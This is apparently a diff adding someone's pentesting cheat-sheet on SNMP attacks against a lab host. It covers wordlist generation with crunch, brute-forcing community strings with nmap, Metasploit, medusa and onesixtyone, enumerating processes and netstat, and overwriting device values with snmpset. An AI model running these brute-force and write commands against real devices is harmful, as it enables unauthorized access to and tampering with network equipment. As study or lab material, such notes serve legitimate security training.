@@ -1,0 +1,76 @@
+crunch -> password list generator
+	crunch 4 4 ad12 > wordlist.txt
+		4	4 character min length
+		4	4 character max length
+		ad12	contains only the a d 1 and 2 characters
+
+SNMP
+	nmap -sU -p 161 -sC 192.168.1.101
+		-sC try default community strings (public, private, etc).
+
+	nmap -sU -p 161 --script snmp-brute 192.168.1.101 --script-args snmp-brute.communitiesdb=/home/jtharel/wordlist.txt
+		--script... -> brute force community string
+
+	nmap -sU -sV -p 161 --script="snmp-interfaces" --script-args="snmpcommunity=a1d2" 192.168.1.101
+		--script-args="snmpcommunity=..." -> snmp community string your got from the brute force
+
+	nmap -sU -sV -p 161 --script="snmp-netstat" --script-args="snmpcommunity=a1d2" 192.168.1.101
+		if it runs it will show the output of the netstat command from the victim
+
+	nmap -sU -sV -p 161 --script="snmp-processes" --script-args="snmpcommunity=a1d2" 192.168.1.101
+		if it runs it will show the output of the ps -ef command
+
+	
+
+
+	Metasploit -> bruteforce community string
+		use auxiliary/scanner/snmp/snmp_login
+		set RHOSTS 192.168.1.101
+		set BLANK_PASSWORDS false
+		set PASS_FILE /home/jtharel/wordlist.txt
+		set STOP_ON_SUCCESS true
+		set THREADS 20
+		set VERBOSE true
+		run
+
+	medusa -h 192.168.1.101 -M snmp -u X -P ./wordlist.txt
+		-u X		medusa requires a username even though there is no user account with snmp
+
+	If router has rw:
+	snmpwalk -v1 -c router-write 192.168.1.101
+		-v1		-> snmp version 1
+		-c router-write	-> community name, usually public	
+
+	Write to snmp:
+	snmpset -v1 -c router-write 192.168.1.101 iso.3.6.1.2.1.1.5.0 s Hacked
+		-v1		-> snmp version 1
+		-c router-write	-> snmp community name #usually public
+		iso...		-> iso.3.6.1.2.1.1.5.0 is the field to change
+		s Hacked	-> s stands for "string" and Hacked is the new value 
+
+
+	onesixtyone -> brutforce tool for brutforcing snmp community strings
+		onesixtyone -c ./wordlist.txt 192.168.1.101
+
+	Metasploit -> dump snmp info once you have the community string
+		use auxiliary/scanner/snmp/snmp_enum
+		set COMMUNITY a1d2
+		set RHOSTS 192.168.1.101
+		run
+
+	 Metasploit -> write to snmp 
+		use auxiliary/scanner/snmp/snmp_set
+		set COMMUNITY a1d3
+		set RHOSTS 192.168.1.101
+		set OID 1.3.6.1.2.1.1.5.0	value is acquired from `snmptranslate -On iso.3.6.1.2.1.1.5.0` minus leading .
+		set OIDVALUE hacked
+		run
+
+	braa -> get, set or walk value under .1.3.6.1.* of the tree
+		braa a1d2@192.168.1.101:161:.1.3.6.1.*
+			a1d2		-> community string
+			:161		-> port
+			:.1.3.6.1.* 	-> where to dump info from
+
+	
+
